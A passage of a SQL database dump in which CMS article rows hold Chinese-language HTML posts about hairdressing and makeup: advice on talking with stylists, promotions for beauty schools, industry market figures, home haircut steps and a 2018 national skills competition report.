16px;\">二、在美发行业，剪发价格从15元到10000元再到30000元甚至更高的发型师都有很多，为什么同样都是剪发，价格差了这么多呢，一个非常重要原因就是很多的发型师缺乏系统性的专业技术，因为很多的发型师都是在店里跟着师傅学习的，只知道这么去做发型，但是为什么这么去剪烫染就不知道啦，这部分的发型师对于发型的变化的理解不是很强，因此当你拿着那些图片去找这些发型师的时候，或者被他朋友圈发的造型作品打动，傻乎乎跑过去说要卷烫同款，办了卡，剪了头，才发现图片里的发型根本不是烫出来的，而自己又成为了实验小白鼠。因此建议很多小姐姐在换发型的时候，选择一家比较不错的理发店哦</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">三、这个是我们在发廊做头发失败的主要原因啦，就是我们在和发型师沟通的时候出现了问题，比如说，发型师，请你帮我把头发修掉一点点，由于语言是非常抽象的，你和发型师对于一点点的理解都是不一样的，沟通都出现了问题，那么发型肯定会有所偏差的，因此最好的办法是你是要剪的短一些呢，还是只要修一点点，请你主动拿手比给理发师看！举起你的手在头发上打量出你要剪的长度，这样才能做出更加符合你心目中的发型哦。因此。在和发型师的沟通当中，细节，细节，细节的描述真的很重要！最后希望所有的小仙女们都能找到适合自己的发型哦</span></p><p><br/></p>','','','219.147.98.86'),(64,11,'<p>现在年轻人都希望能拥有一份属于自己的事业，这样才能给于自己家人更好的物质生活。许多人会绞尽脑汁去思考一份适合自己的事业，但在这个社会上除了学历以外，我们一定要能掌握一门看家本领，大部分的人都会选择技术含量比较高的行业，我们可以去选择每个人都会接触到的行业，这样营业之后就能达到稳赚不赔的目的。今天给通过这了解一下关于学理发的一些事情，能帮助你在最短暂的时间内发家致富，过上自己真正想要的生活。</p><p><br/></p><p>许多人都觉得现在的理发师以及理发机构实在是太多了，很担心自己从事这个行业之后没有办法去赚钱。那么这个时候你就要思考一下自己的理发经，大家肯定很想了解到的是关于自己选择了怎么样的理发师，与此同时有人会了解学理发多久能出师，关于这两个问题的答案应该通过怎样去选择一家好的美发学校。因为好的美发学校，师资好，教学经验丰富，可以在最快的时间内教会你大量的理发技能，而且他们在传授知识的时候也会讲重点去传授，我们就不用担心自己花了大量的时间和金钱之后没有一个满意的答案。所以通过这里简单了解如何能选择好的美发学校，学理发多久能出师就能知晓。</p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551601139616715.jpg\" title=\"1551601139616715.jpg\" alt=\"3 (7).jpg\"/></p><p>首先我们在挑选的时候应该了解一下自己选择的是怎么样的美发学校学习，如今供我们挑选的美发学校实在是太多了，对我们在挑选的时候也会出现眼花缭乱或者是举足无措的时候，我们在挑选的时候尽可能的了解到的是一些基础的问题，比如说关于理发的课程，大该在多少时间内掌握？再比如说关于美发的一些设计技术。多短的时间内掌握大量的知识以及提高自己的审美，这样才能在最快的时间内完成美发的设计。在这里可以了解一下蒙妮坦美发学校，他这里是为了塑造高级美发设计师而开设的，无论你是有基础还是无基础在这里都能掌握最多的知识。许多学员在这里打下了坚实的美发基础，所以他们在创业的时候也让更多的人去觉得他们的技术很好，回头率非常高。</p><p><br/></p><p>这个时候大家肯定更关心的是关于理发多久出师，理发想要出师并不是大家想象中那么困难的一件事情。如果选对美发学校的话，就能缩短一半的时间，我们就能在最快的时间内掌握高级发型师技能技术，而且好的美发学校他们同时也会培养我们具有专业的知识全面以及非常高级的审美能力，这样就能够独立的完成各种人物的发型设计了。你可以在这里了解一下关于我们学好美发之后的一些就业方向，我们可以到世界名牌的公司以及电视台去服务，也可以成为一位高级的发型师以及店面店长等等，我们只要把技术学好的话根本就不用担心没有顾客的问题。</p><p><br/></p>','','','219.147.98.86'),(66,17,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">很多人尤其是没有一技之长傍身的人，都想学一门技术来支撑自己的生活，化妆无疑是大部分人的首选，化妆不仅仅是非常赚钱的行业，也是一个与美和时尚交融的行业，令很多人向往。但大部分人尤其是没有接触过化妆零基础的人，在选择时都心怀犹豫，害怕自己学不会甚至不能掌握高级的化妆技巧。其实很多人不了解学习化妆技巧并不难，主要要选对学校，选择一个认真负责的老师，好的学校和老师能在短时间内帮你掌握所有化妆技术。<br/>&nbsp;</span></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><img src=\"/uploads/allimg/20190303/1551608146855045.jpg\" title=\"1551608146855045.jpg\" alt=\"1 (9).jpg\"/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">零基础到专业化妆师需要多久？一定不要觉得零基础就不能去学化妆，相反零基础的人才更容易短时间内学成，因为化妆是一项靠记忆和熟练度的工作，一些有化妆基础的人会不可避免的存在一些化妆上的误区和化妆时的坏习惯，这些习惯养成后很难改掉，因此在系统的学习化妆时要花费大量的时间纠正自己的不足之处。而零基础的学员就如同白纸，能够良好准确的接受老师教的所有内容，并快速养成好的化妆习惯。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">在学化妆时，找一个靠谱的化妆学校和老师至关重要。对化妆师而言不同的人适合的化妆风格完全不一样，这就要求老师要有丰富的化妆经验和工作经验，而目前市场上的一些学校和老师在教学的时候的经验是非常少，所以就导致在教学过程单一，知识传授不系统，这也就造成了学员在工作和服务客户的过程中不能提供更精准更全面的服务。所以一定要在学习的时候选择正规的学校和老师，那么什么样的学校才是正规的学校呢？零基础学化妆要多长时间呢？</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">我们可以通过网上的化妆学校排名选择前几名的学校或者通过熟人介绍，尤其是一些成立时间久的学校值得选择。梵希国际化妆学校，不仅有完善的教学体系，优质的教师资源，而且成立了33年，是一个非常值得零基础学员选择的学校，学校以培养具有专业知识全面以及潮流时尚审美能力，能够独立完成各种人物的精英化妆师为目标。<br/>&nbsp;</span></p><p><br/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">梵希国际专业化妆师精英文凭课程为期3个月，通过3个月的课程学习旨在发掘并培养学员个人特色。通过系统的对素描、色彩、化妆、发型、摄影后期、中外服饰发展文化、服饰色彩流行等课程的学习，使学员具备专业知识全面及实用性，有创新思维能力，以及潮流时尚的审美能力，能够独立完成各种人物的化妆造型工作，成为符合国际化妆造型师标准的全能人才。在这里你不仅能学到专业的化妆技术，而且学校的收费标准也非常的优惠。给梵希3个月，还你一个满意的人生发展道路。</span></p><p><br/></p>','','','219.147.98.86'),(67,32,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">近年来，美容美发行业逐步向便利化、精细化、品质化方向发展，转型升级过程加速。随着经济的飞速发展，以及人民生活水平的提升，美容美发行业获得了良好的发展机遇。美容美发行业已经成为继房地产、汽车、旅游、通讯，我国居民的第五大消费热点了。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">根据商务部2016年美容美发典型调查企业数据统计测算，截至2016年底，全国美容美发行业活动单位数共计330684个，同比增长2.0%；营业面积共计1905131平方米，同比增长1.5%；从业人员总数为140.9万人，同比增长2.8%；营业额31293434万元，同比增长2.7%。初步统计2017年我国美容美发行业企业数大约为33.72万个，从业人员在144.7万人左右。经测算2017年行业营业额增速回升至3.59%，营业额为3241.75亿元。</span></p><p><img alt=\"\" src=\"/uploads/allimg/20190303/1551613788914314.png\" style=\"border: 0px none; margin: 0px auto 14px; max-height: 100%; max-width: 100%; padding-top: 12px; display: block;\"/></p><p style=\"text-align: center;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">数据来源：中商产业研究院整理</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">数据显示，2015-2017年中国美容美发市场发展迅速。2017年行业营业额增速升至3.59%，营业额为3241.75亿元。中商产业研究院预测2018我国美容美发行业企业数将超34万个，涉及从业人员148.5万人，行业规模将超3400亿元。预计未来五年内，我国美容美发行业市场规模将维持4.56%的复合增速增长，预计到2022年我国美容美发行业市场规模将突破4000亿元。</span></p><p><img alt=\"\" src=\"/uploads/allimg/20190303/1551613789127129.png\" style=\"border: 0px none; margin: 0px auto 14px; max-height: 100%; max-width: 100%; padding-top: 12px; display: block;\"/></p><p style=\"text-align: center;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">数据来源：中商产业研究院整理</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">美容美发行业三大发展趋势</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">1、从业者需求转变，从追求物质财富转为追求精神财富</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">随着90后从业者逐步进入美容美发行业，行业整体学历水平得到大幅提升，从业者也从单纯追求薪资开始向精神财富更深层次的需求转变。未来1至2年内，作为依靠技能服务的“手艺”行业，美容美发企业的发展离不开人才，如何做到人才储备、避免人才流失将成为企业经营者的工作重点。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">2、综合性门店、社区型门店将迎来增长</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">在市场竞争加剧，经营成本压力日趋加大的环境下，越来越多的成熟企业通过兼并、合作的形式来拓展自身服务内容及经营面积，从单一品类业务转向综合性服务企业。同时，随着我国城市化进程的推进以及90后、00后逐渐成为市场消费主体，年轻消费者所推崇的平价、快速、便捷消费理念将推动50-100平米左右的社区型优质门店发展。这两种不同形式、不同规模的企业门店未来将迎来快速增长。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">3、多元化跨界品类经营成为新的发力点</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">近年来，市场增长速度趋于稳定，国家经济形势呈现新常态，为了增加营业收入，进一步拓展客户价值，美容美发行业在传统经营品类及范围内，涌现了部分开展多元化、跨界经营的尝试者。从理论上看，多元化跨界经营、品类延伸是对现有企业品牌资源的深度开发和利用，被视为企业做大规模获取最大利润战略之一。</span></p><p><br/></p>','','','1.180.238.168'),(68,11,'<p><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">　　（一）长发。<br/>　　洗干净头发，梳头，用梳子分缝，如左右两侧，左侧上边三分之一、三分之二处，分别用小皮筋或小卡子固定，右侧类似，把两侧最下边头发拿到肩部前面，照着镜子开始剪。<br/>　　小技巧一：剪发的时候尽可能一层一层剪，越薄越好，剪出来头发有层次感，更自然。剪完了最底下三分之一，打开中间皮筋，剪中部三分之一，最后剪最上边三分之一，还是一层一层剪。<br/>　　小技巧二，竖着拿剪刀，剪出来头发更柔和一些。<br/>　　左边至少分三层剪，右边至少分三层，分的层数越多，头发层次感越好。最后剪刘海，刘海剪发也是类似，分成两层或三层，用皮筋或小卡子固定外层，从最底层剪起，剪完最底层头发后，再从夹起的头发分出下一层。<br/>　　一把剪发的剪刀，皮筋或小卡子若干，电动剃刀、电吹风、镜子</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551621157566140.jpg\" title=\"1551621157566140.jpg\" alt=\"2 (8).jpg\"/></p><p><br/><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">　　（二）短发。<br/>　　第一步，疏通头发。<br/>　　第二步，把后边外部头发用皮筋扎起来，先留下两边鬓角头发，照着镜子开始剪。<br/>　　第三步，打开皮筋，再分出下一层，扎好后边外部头发，照着镜子剪。<br/>　　第四步，打开皮筋，再分出下一层，扎好后边外部头发，照着镜子剪。<br/>　　第五步，一层一层剪出层次，越往外层越比上一层稍微长一点儿。<br/>　　第六步，用电动剃刀剪掉贴着脖子头发向上推，与短发后边衔接一起。<br/>　　第七步，修剪刘海。</span></p>','','','1.180.238.168'),(70,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878955698452.jpg\" style=\"\" title=\"1551878955698452.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878955486439.jpg\" style=\"\" title=\"1551878955486439.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(71,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879185666339.jpg\" style=\"\" title=\"1551879185666339.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879185469403.jpg\" style=\"\" title=\"1551879185469403.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(72,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879274581575.jpg\" title=\"1551879274581575.jpg\" alt=\"a(34).jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879296441555.jpg\" style=\"\" title=\"1551879296441555.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879296958044.jpg\" style=\"\" title=\"1551879296958044.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(73,15,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883139911682.jpg\" style=\"\" title=\"1551883139911682.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883139149709.jpg\" style=\"\" title=\"1551883139149709.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(74,15,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883261572554.jpg\" title=\"1551883261572554.jpg\" alt=\"a(11).jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883244273920.jpg\" title=\"1551883244273920.jpg\" alt=\"a(18).jpg\"/></p>','','','219.147.98.86'),(75,17,'<p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　&nbsp; &nbsp; 爱美之心，人皆有之，无论是十七八岁的妙龄少女，还是三四十岁的都市白领，抑或是人到中年风韵犹存的知性女性，都期待拥有适合自己的美丽。根据自身条件、年龄、气质的不同，设计出适合自身路线的美感，是每个爱美女性的期望。</span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　形象设计师就是为女性实现美丽愿望、创造美的职业。形象设计师一般是从美容、化妆、服装设计等其他职业中衍生而来的，这是一个从业余到专业的过程，从擅长一门到注重整体，从整体风格上为顾客打造最适合个人的外在形象。其目标顾客包括模特、公关等拥有社交需求的人群和广大爱美人士。形象设计师通过提升人的内在素养，协调和美化外在形象，使顾客更加具有独特魅力。形象设计师根据客户的需求，设计出不同的形象艺术。形象设计师工作选择面相当广泛，可就业，也可以创业，主要选择范围为开办形象设计公司、形象设计工作室；为明星、主持人、政要、企业家做形象顾问；为企事业单位做企业文化指导和培训；为化妆品店、服装店做形象导购；为剧组、电视台做造型设计；在高校担任形象设计教学工作等。</span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><br/></span></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><img src=\"/uploads/allimg/20190306/1551883487267702.jpg\" title=\"1551883487267702.jpg\" alt=\"1-(3).jpg\"/></span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　据统计，目前国内从事形象设计包括美容美发行业在内的从业者已经超过了1000万，由于美容美发厅过多造成竞争激烈以及人们对审美要求的提高，形象设计师成为了很多人梦寐以求的“金领”职业，个人形象设计师更是以小时计费，收入十分可观。随着时尚产业的崛起，形象设计作为其重要的组成部分，受到越来越多的关注，具有相当大的市场需求潜力。形象设计已成为当代经济、人文活动中的一个重要部分，个人、企业乃至国家，都需要进行文化基础上的形象设计与全面整合。因此，形象设计是二十一世纪的朝阳产业，有广阔的发展前景。</span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　考证小贴士</span></p><p><span style=\"font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;\">　　经考试(含在线考试)合格，并通过专业资格评审委员会评审，才能获得《中国形象设计行业注册专业资格证书》。形象设计师职业共设三个等级，分别为：三级形象设计师(国家职业资格三级)、二级形象设计师(国家职业资格二级)、一级形象设计师(国家职业资格一级)。</span></p><p><br/></p>','','','219.147.98.86'),(76,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884343423549.jpg\" style=\"\" title=\"1551884343423549.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884343824959.jpg\" style=\"\" title=\"1551884343824959.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(77,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884445321946.jpg\" style=\"\" title=\"1551884445321946.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884445952775.jpg\" style=\"\" title=\"1551884445952775.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(78,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884532160435.jpg\" style=\"\" title=\"1551884532160435.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884532935933.jpg\" style=\"\" title=\"1551884532935933.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884532682729.jpg\" style=\"\" title=\"1551884532682729.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(79,21,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884611958209.jpg\" style=\"\" title=\"1551884611958209.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884611654571.jpg\" style=\"\" title=\"1551884611654571.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884611167755.jpg\" style=\"\" title=\"1551884611167755.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(80,21,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884678987433.jpg\" style=\"\" title=\"1551884678987433.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884678762435.jpg\" style=\"\" title=\"1551884678762435.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884678916771.jpg\" style=\"\" title=\"1551884678916771.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(81,21,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884765168405.jpg\" style=\"\" title=\"1551884765168405.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884765422698.jpg\" style=\"\" title=\"1551884765422698.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(82,21,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884860302314.jpg\" style=\"\" title=\"1551884860302314.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884860736752.jpg\" style=\"\" title=\"1551884860736752.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551884860793301.jpg\" style=\"\" title=\"1551884860793301.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(83,22,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885749406242.jpg\" style=\"\" title=\"1551885749406242.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885749389634.jpg\" style=\"\" title=\"1551885749389634.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(84,22,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885850645545.jpg\" style=\"\" title=\"1551885850645545.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885850257302.jpg\" style=\"\" title=\"1551885850257302.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885850876562.jpg\" style=\"\" title=\"1551885850876562.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(85,22,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885917114734.jpg\" style=\"\" title=\"1551885917114734.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885917801071.jpg\" style=\"\" title=\"1551885917801071.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885917913681.jpg\" style=\"\" title=\"1551885917913681.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(86,22,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885987301442.jpg\" style=\"\" title=\"1551885987301442.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885987434456.jpg\" style=\"\" title=\"1551885987434456.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551885987309891.jpg\" style=\"\" title=\"1551885987309891.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(87,32,'<p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　2018年11月4日，全国商业行业美发美容职业技能竞赛总决赛在上海光大会展中心隆重举行，本次大赛是国家二类大赛，由中国商业联合会、中国就业培训技术指导中心主办，中国商业联合会健康美业专业委员会、上海美发美容行业协会承办。大赛选手由全国20多个省市近400位行业高手组成，赛事规模近千人。中国技能大赛，聚集了潮流美业届的领军人物，不得不说也是给我们从业人员一次学习与交流沟通的平台。</span></p><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400850183525.jpg\" width=\"550\" height=\"360\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400851136352.jpg\" width=\"550\" height=\"364\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"></center><p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　本届大赛，美发师比赛项目中设置了女士剪吹、男士剪吹、女士盘发造型全能三个项目;美容师比赛项目设置了面部护理、美睫、美甲、晚宴化妆造型全能四个项目，更是向所有行业人指明了美业职业技能的发展方向。针对美发师、美容师的全能比赛项目的开创也是全国美发美容比赛的创新之举，想必本届比赛对今后全国美业专业的比赛的开展起到了又一高度的领引作用。</span></p><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400853874202.jpg\" width=\"550\" height=\"363\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400854404434.jpg\" width=\"550\" height=\"366\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400854869027.jpg\" width=\"550\" height=\"363\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400855626932.jpg\" width=\"550\" height=\"365\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　我国大力提倡全能型人才，更是在技术领域要求工匠精神，这是每一个美业从业者对自己的更高要求。本次大赛，以“匠心封神，知遇未来”为主题，为选手们提供了展示自我的平台。用新时代的匠心和匠艺，镌刻中国工匠的精神与梦想。</span></p><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400856609817.jpg\" width=\"550\" height=\"365\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　在赛后的记者采访中，能够感受到选手们参加比赛的激动心情。对美容美发行业更多的是热爱，对成绩更多的是坦然。选手们说，很珍惜这次机会，能够学习和感受到同行们的水平和实力，让自己有很多收获，一次最新炫酷技术与造型的巅峰对决!更是对自己技能水平的一次肯定。</span></p><center style=\"line-height: 1.8; font-size: 20px; margin: 15px auto; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><img alt=\"\" src=\"/uploads/allimg/20190312/1552400857583170.jpg\" width=\"550\" height=\"365\" style=\"border: 0px; margin: 0px; padding: 0px; text-align: left; max-width: 640px;\"/></center><p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　盛大的比赛在成功的喜悦中完美落幕，胜利的呼喊声响彻人们的耳边。一次历练，一次飞跃,努力换来的欣喜洋溢选手们的脸上。</span></p><p style=\"line-height: 1.8; color: rgb(37, 37, 37); font-family: 宋体B8B体, arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">　　本届大赛组织方中国商业联合会健康美业专委会秘书长易杰女士表示：技能立业，以技为本。这是对每个美业从业者的要求和考验，大赛虽然只有一天，但是它所带来的行业交流和专业对接是长远意义的突破，对于美业的发展也是具有推进作用的升华。</span></p><p><br/></p>','','','1.180.238.168'),(88,32,'<p style=\"margin-top: 22px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">学习一门手艺如何？可能有些人认为不过是考不上大学，当不了白领，无奈之下才学一门手艺。其实不然，据我观察能够以纹绣师或者美甲师、美容师、美发师为职业的，并不像很多人认为的那么简单。笨的人成为不了手艺人，情商低人做不长手艺人，不爱学习的不喜欢思考的做不好手艺人，不会欣赏发现别人的美的人不能成为优秀的手艺人。</span></p><p style=\"text-align:center\"><img class=\"large\" data-loadfunc=\"0\" src=\"http://t12.baidu.com/it/u=3543059624,1973787655&fm=173&app=25&f=JPEG?w=640&h=426&s=B502DF1443E3791DD8D1C4DB030050B2\" data-loaded=\"0\" style=\"border: 0px; width: 537px; display: block;\"/></p><p style=\"margin-top: 26px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">人才，是指具有一定的专业知识或专门技能，进行创造性劳动并对社会做出贡献的人所以，纹绣师也好，美发师美容师美甲师也好，只要是社会需要的职业，就是高尚的职业，只要做到爱岗敬业乐业，便是对社会有价值的人才。</span></p><p style=\"margin-top: 22px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 